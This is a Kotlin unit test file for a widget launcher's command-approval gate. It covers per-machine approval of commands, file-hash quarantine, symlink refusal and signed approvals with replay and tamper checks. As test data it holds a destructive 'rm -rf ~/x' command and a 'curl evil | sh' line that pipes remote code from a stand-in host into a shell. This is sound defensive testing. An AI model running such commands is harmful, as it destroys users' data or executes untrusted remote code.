package dev.omalauncher.widgets.runtime

import org.json.JSONArray
import org.json.JSONObject
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.nio.file.Files

/** The run-time gate (Soma Canvas slice 7b): what runs is what he approved on this machine, as it is about to run. */
class CommandGateTest {
    private fun gate(now: () -> Long = { 1_000_000L }) = CommandGate(Files.createTempDirectory("gate").toFile().resolve("approved.json"), "macpro", now)

    @Test fun aCommandRunsOnlyAsApprovedAndAChangedOneAsksAgain() {
        val gate = gate()
        assertFalse(gate.allowed("w.owl", "date"))
        gate.ask("w.owl", "date"); gate.ask("w.owl", "date")
        assertEquals(1, gate.commandAsks().size)
        gate.answer(gate.commandAsks().single(), allow = true)
        assertTrue(gate.allowed("w.owl", "date"))
        // Hashed as it runs: the same widget building a different command from its values is asked again.
        assertFalse(gate.allowed("w.owl", "date +%s"))
        // Another widget running the same command is its own question.
        assertFalse(gate.allowed("other.owl", "date"))
        // Kept: a new gate reading the same file agrees.
        val again = CommandGate(gate.javaClass.getDeclaredField("file").apply { isAccessible = true }.get(gate) as java.io.File, "macpro")
        assertTrue(again.allowed("w.owl", "date"))
    }

    @Test fun aDenialIsntAskedAgainUntilTheFileChanges() {
        val gate = gate()
        gate.ask("w.owl", "rm -rf ~/x")
        gate.answer(gate.commandAsks().single(), allow = false)
        gate.ask("w.owl", "rm -rf ~/x")
        assertTrue(gate.commandAsks().isEmpty())
        assertFalse(gate.allowed("w.owl", "rm -rf ~/x"))
        gate.approveFile("w.owl", sha256("a new version"))
        gate.ask("w.owl", "rm -rf ~/x")
        assertEquals(1, gate.commandAsks().size)
    }

    @Test fun aQuarantinedFileLoadsOnlyAsApprovedAndWaitsAgainWhenItChanges() {
        val dir = Files.createTempDirectory("lib").toFile()
        val gate = gate()
        val lib = WidgetLibrary(dir, gate)
        dir.resolve("w.owl").writeText("widget \"w\" { }")
        assertNull(lib.approvedText("w.owl"))
        val ask = gate.fileAsks().single()
        gate.approveFile(ask.widget, ask.fileHash)
        assertEquals("widget \"w\" { }", lib.approvedText("w.owl"))
        dir.resolve("w.owl").writeText("widget \"w\" { size: 3x2 }")
        assertNull(lib.approvedText("w.owl"))
        assertEquals(sha256("widget \"w\" { size: 3x2 }"), gate.fileAsks().single().fileHash)
        // Nothing outside the library is read by name.
        assertNull(lib.approvedText("../approved.json"))
    }

    @Test fun aDamagedFileApprovesNothingAndNeverThrows() {
        val dir = Files.createTempDirectory("gate").toFile()
        for (text in listOf("not json", "[]", "{\"widgets\":[]}", "{\"widgets\":{\"w.owl\":{\"commands\":\"x\"}}}", "{\"widgets\":{\"w.owl\":{\"commands\":[1,2]}}}")) {
            dir.resolve("approved.json").writeText(text)
            assertFalse(text, CommandGate(dir.resolve("approved.json"), "macpro").allowed("w.owl", "date"))
        }
    }

    @Test fun aLinkInTheLibraryIsNeverRead() {
        val dir = Files.createTempDirectory("lib").toFile()
        val outside = Files.createTempFile("secret", ".owl").toFile().apply { writeText("widget \"s\" { }") }
        Files.createSymbolicLink(dir.resolve("hosts.owl").toPath(), outside.toPath())
        val gate = gate()
        val lib = WidgetLibrary(dir, gate)
        assertEquals(emptyList<String>(), lib.names())
        assertNull(lib.approvedText("hosts.owl"))
        assertTrue(gate.fileAsks().isEmpty())
    }

    private val key = "a device key of thirty-two bytes!".toByteArray()

    private fun signed(machine: String = "macpro", nonce: String = "n0nce-0123456789ab", time: Long = 1_000_000L, commands: List<String> = listOf(sha256("date")), sigKey: ByteArray = key, device: String = "fold"): String {
        val file = sha256("widget text")
        val sig = CommandGate.sign(sigKey, CommandGate.signedText(device, machine, "w.owl", file, commands, nonce, time))
        return JSONObject().put("device", device).put("machine", machine).put("widget", "w.owl").put("file", file).put("commands", JSONArray(commands))
            .put("nonce", nonce).put("time", time).put("sig", sig).toString()
    }

    @Test fun aSignedApprovalFromAPairedDeviceAppliesOnceAndOnlyToThisMachine() {
        val gate = gate()
        val keys = { d: String -> if (d == "fold") key else null }
        assertEquals("it names another machine", gate.applySigned(signed(machine = "macbook"), keys))
        assertEquals("its signature is wrong", gate.applySigned(signed(sigKey = "another key entirely, 32 bytes!!".toByteArray()), keys))
        assertEquals("it is from a device that isn't paired", gate.applySigned(signed(device = "stranger"), keys))
        assertEquals("it is too old, or from the future", gate.applySigned(signed(time = 1_000_000L - CommandGate.WINDOW_MS - 1), keys))
        assertEquals("it is incomplete", gate.applySigned(signed(commands = listOf("date")), keys))
        assertEquals("it is from a device that isn't paired", gate.applySigned(signed(), { ByteArray(0) }))
        assertEquals("it is incomplete", gate.applySigned(JSONObject(signed()).put("widget", "w.owl\nextra").toString(), keys))
        assertFalse(gate.allowed("w.owl", "date"))
        assertNull(gate.applySigned(signed(), keys))
        assertTrue(gate.allowed("w.owl", "date"))
        assertTrue(gate.fileApproved("w.owl", "widget text"))
        assertEquals("it was used before", gate.applySigned(signed(), keys))
        // A changed field breaks the signature: the commands it names are the commands it approves.
        val tampered = JSONObject(signed(nonce = "n0nce-fresh-1234567")).put("commands", JSONArray(listOf(sha256("curl evil | sh")))).toString()
        assertEquals("its signature is wrong", gate.applySigned(tampered, keys))
        assertFalse(gate.allowed("w.owl", "curl evil | sh"))
    }
}
